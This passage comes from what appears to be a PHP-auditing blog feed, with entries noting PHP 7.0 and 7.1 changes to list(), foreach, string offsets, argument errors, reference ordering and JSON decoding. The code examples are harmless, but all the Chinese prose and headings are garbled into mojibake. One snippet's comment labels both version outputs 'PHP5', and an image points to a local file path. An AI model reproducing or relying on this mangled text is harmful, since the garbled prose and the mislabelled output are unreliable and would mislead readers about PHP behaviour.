<code>$_SESSION</code>ã€‚</p><p>ä½†æ˜¯æˆ‘æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼ŒPHP7.0å·²ç»ä¼šè¿”å›Falseäº†ï¼ˆWin+PHP7.12nts</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">session_start</span>(<span class="hljs-string">&#x27;11&#x27;</span>));<br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><span class="hljs-comment"># ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">php5</span><br><span class="hljs-comment">bool(true)</span><br><span class="hljs-comment">array(0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP5</span><br><span class="hljs-comment">bool(false)</span><br><span class="hljs-comment">NULL</span><br></code></pre></td></tr></table></figure><h2 id="ï¼ˆåºŸå¼ƒï¼‰ä¸¤ä¸ªå‡½æ•°çš„Evalé€‰é¡¹"><a href="#ï¼ˆåºŸå¼ƒï¼‰ä¸¤ä¸ªå‡½æ•°çš„Evalé€‰é¡¹" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰ä¸¤ä¸ªå‡½æ•°çš„Evalé€‰é¡¹"></a>ï¼ˆåºŸå¼ƒï¼‰ä¸¤ä¸ªå‡½æ•°çš„Evalé€‰é¡¹</h2><p><a href="https://www.php.net/manual/zh/function.mb-ereg-replace.php">mb_ereg_replace()</a>å’Œ<a href="https://www.php.net/manual/zh/function.mb-eregi-replace.php">mb_eregi_replace()</a></p><h2 id="ï¼ˆåºŸå¼ƒï¼‰ext-mcrypt"><a href="#ï¼ˆåºŸå¼ƒï¼‰ext-mcrypt" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰ext&#x2F;mcrypt"></a>ï¼ˆåºŸå¼ƒï¼‰ext&#x2F;mcrypt</h2><h1 id="PHP7-1è¯­æ³•ç›¸å…³çš„å˜æ›´"><a href="#PHP7-1è¯­æ³•ç›¸å…³çš„å˜æ›´" class="headerlink" title="PHP7.1è¯­æ³•ç›¸å…³çš„å˜æ›´"></a>PHP7.1è¯­æ³•ç›¸å…³çš„å˜æ›´</h1><h2 id="å¢åŠ ï¼‰çŸ­æ•°ç»„"><a href="#å¢åŠ ï¼‰çŸ­æ•°ç»„" class="headerlink" title="(å¢åŠ ï¼‰çŸ­æ•°ç»„"></a>(å¢åŠ ï¼‰çŸ­æ•°ç»„</h2><p>çŸ­æ•°ç»„è¯­æ³•<code>[]</code>ç°åœ¨ä½œä¸º<code>list()</code>è¯­æ³•çš„ä¸€ä¸ªå¤‡é€‰é¡¹ï¼Œå¯ä»¥ç”¨äºå°†æ•°ç»„çš„å€¼èµ‹ç»™ä¸€äº›å˜é‡ï¼ˆåŒ…æ‹¬åœ¨<em>foreach</em>ä¸­ï¼‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-comment">// list() style</span><br><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$id1</span>, <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-comment">#[$id1, $name1] = $data[0];</span><br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$id</span> <span class="hljs-subst">$name</span>\n&quot;</span>;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-variable">$id</span>, <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ï¼ˆå¢åŠ ï¼‰æ”¯æŒä¸ºè´Ÿçš„å­—ç¬¦ä¸²åç§»é‡"><a href="#ï¼ˆå¢åŠ ï¼‰æ”¯æŒä¸ºè´Ÿçš„å­—ç¬¦ä¸²åç§»é‡" class="headerlink" title="ï¼ˆå¢åŠ ï¼‰æ”¯æŒä¸ºè´Ÿçš„å­—ç¬¦ä¸²åç§»é‡"></a>ï¼ˆå¢åŠ ï¼‰æ”¯æŒä¸ºè´Ÿçš„å­—ç¬¦ä¸²åç§»é‡</h2><p>ç°åœ¨æ‰€æœ‰æ”¯æŒåç§»é‡çš„<a href="https://www.php.net/manual/zh/book.strings.php">å­—ç¬¦ä¸²æ“ä½œå‡½æ•°</a> éƒ½æ”¯æŒæ¥å—è´Ÿæ•°ä½œä¸ºåç§»é‡ï¼ŒåŒ…æ‹¬é€šè¿‡<code>[]</code>æˆ–<code>&#123;&#125;</code>æ“ä½œ<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.substr">å­—ç¬¦ä¸²ä¸‹æ ‡</a>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ä¸ªè´Ÿæ•°çš„åç§»é‡ä¼šè¢«ç†è§£ä¸ºä¸€ä¸ªä»å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„åç§»é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;abcdef&quot;</span>[-<span class="hljs-number">2</span>]); <span class="hljs-comment">// string (1) &quot;e&quot;</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;aabbcc&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, -<span class="hljs-number">3</span>));  <span class="hljs-comment">// int(3)</span><br></code></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²ä¹ŸåŒæ ·æ”¯æŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The last character of &#x27;<span class="hljs-subst">$string</span>&#x27; is &#x27;<span class="hljs-subst">$string</span>[-1]&#x27;.\n&quot;</span>;<br><br><span class="hljs-comment"># ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">The last character of &#x27;bar&#x27; is &#x27;r&#x27;.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="ï¼ˆå¢åŠ ï¼‰å½“ä¼ é€’å‚æ•°è¿‡å°‘æ—¶å°†æŠ›å‡ºé”™è¯¯"><a href="#ï¼ˆå¢åŠ ï¼‰å½“ä¼ é€’å‚æ•°è¿‡å°‘æ—¶å°†æŠ›å‡ºé”™è¯¯" class="headerlink" title="ï¼ˆå¢åŠ ï¼‰å½“ä¼ é€’å‚æ•°è¿‡å°‘æ—¶å°†æŠ›å‡ºé”™è¯¯"></a>ï¼ˆå¢åŠ ï¼‰å½“ä¼ é€’å‚æ•°è¿‡å°‘æ—¶å°†æŠ›å‡ºé”™è¯¯</h2><p>åœ¨è¿‡å»å¦‚æœæˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„å‡½æ•°æ—¶ï¼Œæä¾›çš„å‚æ•°ä¸è¶³ï¼Œé‚£ä¹ˆå°†ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Š(warning)ã€‚ ç°åœ¨ï¼Œè¿™ä¸ªè­¦å‘Šè¢«æå‡ä¸ºä¸€ä¸ªé”™è¯¯å¼‚å¸¸(Error exception)ï¼Œæ„å‘³ç€PHPä¼šä¸­æ–­æ‰§è¡Œã€‚è¿™ä¸ªå˜æ›´ä»…å¯¹ç”¨æˆ·å®šä¹‰çš„å‡½æ•°ç”Ÿæ•ˆï¼Œ å¹¶ä¸åŒ…å«å†…ç½®å‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1\n&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>();<br><span class="hljs-title function_ invoke__">test</span>();<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-10-2_PHP_PHP71%E8%AF%AD%E6%B3%95%E7%9B%B8%E5%85%B3%E5%8F%98%E6%9B%B4_1.png"></p><h2 id="å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºå…ƒç´ çš„é¡ºåºæ›´æ”¹"><a href="#å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºå…ƒç´ çš„é¡ºåºæ›´æ”¹" class="headerlink" title="å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºå…ƒç´ çš„é¡ºåºæ›´æ”¹"></a>å¼•ç”¨æ•°ç»„å…ƒç´ åˆ›å»ºå…ƒç´ çš„é¡ºåºæ›´æ”¹</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml">&lt;?php<br>$<span class="hljs-built_in">array</span> = <span class="hljs-literal">[]</span>;<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; $<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>$<span class="hljs-built_in">array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br>var_dump($<span class="hljs-built_in">array</span>);<br><br># ç»“æœ<br>/*<br><span class="hljs-type">PHP7</span>.<span class="hljs-number">0</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-type">PHP7</span>.<span class="hljs-number">1</span><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br>*/<br></code></pre></td></tr></table></figure><h2 id="JSONç¼–ç å’Œè§£ç "><a href="#JSONç¼–ç å’Œè§£ç " class="headerlink" title="JSONç¼–ç å’Œè§£ç "></a>JSONç¼–ç å’Œè§£ç </h2><p>è§£ç ä¸€ä¸ªç©ºé”®å€¼å°†ä¼šè§£æä¸ºä¸€ä¸ªç©ºå±æ€§åï¼Œè€Œä¹‹å‰ä¼šè§£æä¸º<code>_empty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;&#x27;</span> =&gt; <span class="hljs-number">1</span>])));<br><br><span class="hljs-comment"># ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;_empty_&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.1</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h1><h2 id="å¯ä¸ºç©ºï¼ˆNullableï¼‰ç±»å‹-Â¶"><a href="#å¯ä¸ºç©ºï¼ˆNullableï¼‰ç±»å‹-Â¶" class="headerlink" title="å¯ä¸ºç©ºï¼ˆNullableï¼‰ç±»å‹ Â¶"></a>å¯ä¸ºç©ºï¼ˆNullableï¼‰ç±»å‹<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.nullable-types"> Â¶</a></h2><h2 id="Void-å‡½æ•°-Â¶"><a href="#Void-å‡½æ•°-Â¶" class="headerlink" title="Void å‡½æ•° Â¶"></a>Void å‡½æ•°<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.void-functions"> Â¶</a></h2><h2 id="ç±»å¸¸é‡å¯è§æ€§-Â¶"><a href="#ç±»å¸¸é‡å¯è§æ€§-Â¶" class="headerlink" title="ç±»å¸¸é‡å¯è§æ€§ Â¶"></a>ç±»å¸¸é‡å¯è§æ€§<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.class-constant-visibility"> Â¶</a></h2><h2 id="iterable-ä¼ªç±»-Â¶"><a href="#iterable-ä¼ªç±»-Â¶" class="headerlink" title="iterable ä¼ªç±» Â¶"></a><a href="https://www.php.net/manual/zh/language.types.iterable.php">iterable</a> ä¼ªç±»<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.iterable-pseudo-type"> Â¶</a></h2><h2 id="å¤šå¼‚å¸¸æ•è·å¤„ç†-Â¶"><a href="#å¤šå¼‚å¸¸æ•è·å¤„ç†-Â¶" class="headerlink" title="å¤šå¼‚å¸¸æ•è·å¤„ç† Â¶"></a>å¤šå¼‚å¸¸æ•è·å¤„ç†<a href="https://www.php.net/manual/zh/migration71.new-features.php#migration71.new-features.mulit-catch-exception-handling"> Â¶</a></h2><h2 id="Invalid-class-interface-and-trait-names-Â¶"><a href="#Invalid-class-interface-and-trait-names-Â¶" class="headerlink" title="Invalid class, interface, and trait names Â¶"></a>Invalid class, interface, and trait names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.invalid-class-names"> Â¶</a></h2><h2 id="Numerical-string-conversions-now-respect-scientific-notation-Â¶"><a href="#Numerical-string-conversions-now-respect-scientific-notation-Â¶" class="headerlink" title="Numerical string conversions now respect scientific notation Â¶"></a>Numerical string conversions now respect scientific notation<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.numerical-strings-scientific-notation"> Â¶</a></h2><h2 id="Fixes-to-mt-rand-algorithm-Â¶"><a href="#Fixes-to-mt-rand-algorithm-Â¶" class="headerlink" title="Fixes to mt_rand() algorithm Â¶"></a>Fixes to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> algorithm<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.fixes-to-mt_rand-algorithm"> Â¶</a></h2><h2 id="rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-Â¶"><a href="#rand-aliased-to-mt-rand-and-srand-aliased-to-mt-srand-Â¶" class="headerlink" title="rand() aliased to mt_rand() and srand() aliased to mt_srand() Â¶"></a><a href="https://www.php.net/manual/zh/function.rand.php">rand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-rand.php">mt_rand()</a> and <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> aliased to <a href="https://www.php.net/manual/zh/function.mt-srand.php">mt_srand()</a> <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.rand-srand-aliases">Â¶</a></h2><h2 id="Disallow-the-ASCII-delete-control-character-in-identifiers-Â¶"><a href="#Disallow-the-ASCII-delete-control-character-in-identifiers-Â¶" class="headerlink" title="Disallow the ASCII delete control character in identifiers Â¶"></a>Disallow the ASCII delete control character in identifiers<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.delete-control-character-in-identifiers"> Â¶</a></h2><h2 id="åœ¨ä¸å®Œæ•´çš„å¯¹è±¡ä¸Šä¸å†è°ƒç”¨ææ„æ–¹æ³•-Â¶"><a href="#åœ¨ä¸å®Œæ•´çš„å¯¹è±¡ä¸Šä¸å†è°ƒç”¨ææ„æ–¹æ³•-Â¶" class="headerlink" title="åœ¨ä¸å®Œæ•´çš„å¯¹è±¡ä¸Šä¸å†è°ƒç”¨ææ„æ–¹æ³• Â¶"></a>åœ¨ä¸å®Œæ•´çš„å¯¹è±¡ä¸Šä¸å†è°ƒç”¨ææ„æ–¹æ³•<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.dont-call-destructors"> Â¶</a></h2><h2 id="call-user-func-ä¸å†æ”¯æŒå¯¹ä¼ å€çš„å‡½æ•°çš„è°ƒç”¨-Â¶"><a href="#call-user-func-ä¸å†æ”¯æŒå¯¹ä¼ å€çš„å‡½æ•°çš„è°ƒç”¨-Â¶" class="headerlink" title="call_user_func()ä¸å†æ”¯æŒå¯¹ä¼ å€çš„å‡½æ•°çš„è°ƒç”¨ Â¶"></a><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func()</a>ä¸å†æ”¯æŒå¯¹ä¼ å€çš„å‡½æ•°çš„è°ƒç”¨ <a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.call_user_func-with-ref-args">Â¶</a></h2><h2 id="inié…ç½®é¡¹ç§»é™¤-Â¶"><a href="#inié…ç½®é¡¹ç§»é™¤-Â¶" class="headerlink" title="inié…ç½®é¡¹ç§»é™¤ Â¶"></a>inié…ç½®é¡¹ç§»é™¤<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.removed-ini-directives"> Â¶</a></h2><h2 id="Sort-order-of-equal-elements"><a href="#Sort-order-of-equal-elements" class="headerlink" title="Sort order of equal elements"></a>Sort order of equal elements</h2><h2 id="Lexically-bound-variables-cannot-reuse-names-Â¶"><a href="#Lexically-bound-variables-cannot-reuse-names-Â¶" class="headerlink" title="Lexically bound variables cannot reuse names Â¶"></a>Lexically bound variables cannot reuse names<a href="https://www.php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.lexical-names"> Â¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>phpå®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.0ç‰¹æ€§</title>
    <link href="/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°å˜æ›´"><a href="#å‡½æ•°å˜æ›´" class="headerlink" title="å‡½æ•°å˜æ›´"></a>å‡½æ•°å˜æ›´</h1><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.php.net/manual/zh/appendices.php">https://www.php.net/manual/zh/appendices.php</a></li><li><a href="http://xiaoze.club/">http://xiaoze.club/</a></li></ul><h2 id="å…³äºlistå¤„ç†æ–¹å¼çš„å˜æ›´"><a href="#å…³äºlistå¤„ç†æ–¹å¼çš„å˜æ›´" class="headerlink" title="å…³äºlistå¤„ç†æ–¹å¼çš„å˜æ›´"></a>å…³äºlistå¤„ç†æ–¹å¼çš„å˜æ›´</h2><p><strong>listä¸å†ä»¥åå‘çš„é¡ºåºæ¥è¿›è¡Œèµ‹å€¼</strong></p><p><code>list</code>ç°åœ¨ä¼šæŒ‰ç…§å˜é‡å®šä¹‰çš„é¡ºåºæ¥ç»™ä»–ä»¬è¿›è¡Œèµ‹å€¼ï¼Œè€Œéåè¿‡æ¥çš„é¡ºåºã€‚ é€šå¸¸æ¥è¯´ï¼Œè¿™åªä¼šå½±å“<code>list</code>ä¸æ•°ç»„çš„<code>[]</code>æ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨çš„æ¡ˆä¾‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[]) = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨èä¸è¦ä¾èµ–l<code>ist</code>çš„èµ‹å€¼é¡ºåºï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªåœ¨æœªæ¥ä¹Ÿè®¸ä¼šå˜æ›´çš„å®ç°ç»†èŠ‚ã€‚</p><p><strong>list ç»“æ„ç°åœ¨ä¸å†èƒ½æ˜¯ç©ºçš„</strong></p><p>listç»“æ„ç°åœ¨ä¸å†èƒ½æ˜¯ç©ºçš„ã€‚å¦‚ä¸‹çš„ä¾‹å­ä¸å†è¢«å…è®¸ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>() = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(,,) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$x</span>, <span class="hljs-keyword">list</span>(), <span class="hljs-variable">$y</span>) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$x</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>listä¸å†èƒ½è§£å¼€string</strong></p><p><code>list</code>ä¸å†èƒ½è§£å¼€å­—ç¬¦ä¸²ï¼ˆstringï¼‰å˜é‡ã€‚ ä½ å¯ä»¥ä½¿ç”¨<code>str_split</code>æ¥ä»£æ›¿å®ƒ</p><h2 id="foreachçš„å˜åŒ–"><a href="#foreachçš„å˜åŒ–" class="headerlink" title="foreachçš„å˜åŒ–"></a>foreachçš„å˜åŒ–</h2><p><code>foreach</code>å‘ç”Ÿäº†ç»†å¾®çš„å˜åŒ–ï¼Œæ§åˆ¶ç»“æ„ï¼Œ ä¸»è¦å›´ç»•é˜µåˆ—çš„å†…éƒ¨æ•°ç»„æŒ‡é’ˆå’Œè¿­ä»£å¤„ç†çš„ä¿®æ”¹ã€‚</p><p><strong>foreachä¸å†æ”¹å˜å†…éƒ¨æ•°ç»„æŒ‡é’ˆ</strong></p><p>åœ¨PHP7ä¹‹å‰ï¼Œå½“æ•°ç»„é€šè¿‡<code>foreach</code>è¿­ä»£æ—¶ï¼Œæ•°ç»„æŒ‡é’ˆä¼šç§»åŠ¨ã€‚ç°åœ¨å¼€å§‹ï¼Œä¸å†å¦‚æ­¤ï¼Œè§ä¸‹é¢ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-variable">$array</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>)<br>    <br>PHP7<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span 